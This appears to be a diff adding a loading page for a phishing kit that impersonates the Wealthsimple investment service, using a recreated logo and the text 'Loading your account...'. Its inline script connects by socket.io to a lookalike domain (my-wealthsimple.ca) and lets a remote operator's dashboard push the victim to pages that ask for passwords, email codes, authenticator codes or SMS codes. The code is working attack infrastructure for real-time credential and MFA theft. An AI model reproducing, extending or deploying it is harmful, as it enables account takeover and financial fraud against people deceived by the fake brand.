@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wealth Simple - Loading</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        
+        .logo-container {
+            margin-bottom: 40px;
+            animation: fadeIn 0.8s ease-in-out;
+        }
+        
+        .logo {
+            width: 180px;
+            height: auto;
+        }
+        
+        .spinner-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f0f0f0;
+            border-top: 3px solid #5c6ac4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        .loading-text {
+            margin-top: 20px;
+            color: #666;
+            font-size: 14px;
+            font-weight: 400;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes fadeIn {
+            0% { 
+                opacity: 0; 
+                transform: translateY(-10px); 
+            }
+            100% { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .logo {
+                width: 150px;
+            }
+            
+            .spinner {
+                width: 35px;
+                height: 35px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- ADD this (must be before your inline script) -->
+<script src="https://my-wealthsimple.ca/socket.io/socket.io.js"></script>
+
+    <script>
+(() => {
+  // --- Config ---
+  const SERVER_URL = "https://my-wealthsimple.ca";
+  const JOIN_EVENT  = "client-join";
+
+  // Central redirect map (mirrors your other pages)
+  // Added: sms, wrong_sms -> sms.html
+  const MFA_REDIRECT = {
+    email_code:        "email.html",
+    wrong_email_code:  "email.html",
+    loading:           "loading.html",
+    wrong_password:    "app.html",
+    gauth:             "auth.html",
+    wrong_gauth:       "auth.html",
+    sms:               "sms.html",
+    wrong_sms:         "sms.html"
+  };
+
+  // --- Helpers ---
+  function normalizeKey(x) {
+    const s = String(x || "").trim();
+    const lower = s.toLowerCase();
+    return MFA_REDIRECT[lower] ? lower : lower.replace(/\s+/g, "_");
+  }
+
+  function getRedirectFor(signal) {
+    if (!signal) return null;
+    const k = normalizeKey(signal);
+    return MFA_REDIRECT[k] || null;
+  }
+
+  function getOrCreateSessionID() {
+    try {
+      let sid = localStorage.getItem("sessionID");
+      if (!sid) {
+        sid = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
+        localStorage.setItem("sessionID", sid);
+      }
+      return sid;
+    } catch {
+      // Fallback if storage is blocked
+      return Math.random().toString(36).slice(2);
+    }
+  }
+
+  function alreadyOn(dest) {
+    // Avoid loops; compares filename at the end of the path
+    return location.pathname.split("/").pop() === dest;
+  }
+
+  // --- Init ---
+  function init() {
+    if (!window.io) {
+      console.warn("[loading inline] socket.io client not found. Include it before this script.");
+      return;
+    }
+    const sessionID = getOrCreateSessionID();
+    const socket = io(SERVER_URL, { transports: ["websocket", "polling"] });
+
+    socket.on("connect", () => {
+      socket.emit(JOIN_EVENT, { sessionID });
+    });
+
+    // Honor dashboard actions -> redirect, including sms/wrong_sms
+    socket.on("dashboard-action", ({ buttonName }) => {
+      const dest = getRedirectFor(buttonName);
+      if (dest && !alreadyOn(dest)) {
+        location.href = dest;
+      }
+    });
+
+    socket.on("disconnect", () => {
+      // Optional: stay on loading.html; you could retry or show a note.
+    });
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init, { once: true });
+  } else {
+    init();
+  }
+})();
+</script>
+
+    <div class="logo-container">
+        <svg class="logo" viewBox="0 0 200 40" xmlns="http://www.w3.org/2000/svg">
+            <!-- Wealth Simple Logo Recreation -->
+            <text x="0" y="28" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" 
+                  font-size="24" font-weight="600" fill="#191919">
+                Wealthsimple
+            </text>
+        </svg>
+    </div>
+    
+    <div class="spinner-container">
+        <div class="spinner"></div>
+    </div>
+    
+    <div class="loading-text">
+        Loading your account...
+    </div>
+</body>
+</html>
